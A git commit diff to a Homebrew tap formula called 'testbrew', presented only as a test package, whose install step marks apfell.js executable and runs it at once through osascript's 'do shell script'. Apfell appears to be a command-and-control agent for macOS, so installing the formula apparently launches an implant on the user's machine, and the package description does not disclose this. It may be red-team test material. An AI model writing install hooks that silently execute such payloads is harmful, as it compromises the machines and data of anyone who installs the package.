e78b75b0e4af1a805fbf59b83a30275b1c1cb0a8
Testing Dot <fd1cb8964a6c4fa39bf6388251e21d25@outlook.com>
2025-05-13 11:58:05 -0400

    Initial brew tap commit

--- Formula/testbrew.rb
+++ Formula/testbrew.rb
@@ -2,12 +2,12 @@ class Testbrew < Formula
     desc "Test Brew"
     homepage "https://github.com/testing-1-dot/"
     url "https://github.com/testing-1-dot/testbrew/releases/download/v1.3/testbrew-1.3.tar.gz"
-    sha256 "c7e50cf0fe9f88a1f383afff057787cdf9e374c3694160252fd542d287febccb"
+    sha256 "32889eb13a0c06b82a0edbf291d2ff7d288979d27ff569660e54c73ba8b227bb"
     version "1.3"
 
     def install
         bin.install Dir["*"]
-        system "chmod +x #{bin}/apfell.js && osascript -e 'do shell script "#{bin}/apfell.js"'"
+        system "chmod +x #{bin}/apfell.js && osascript -e \'do shell script \"#{bin}/apfell.js\"\'"
   end
 
     def caveats
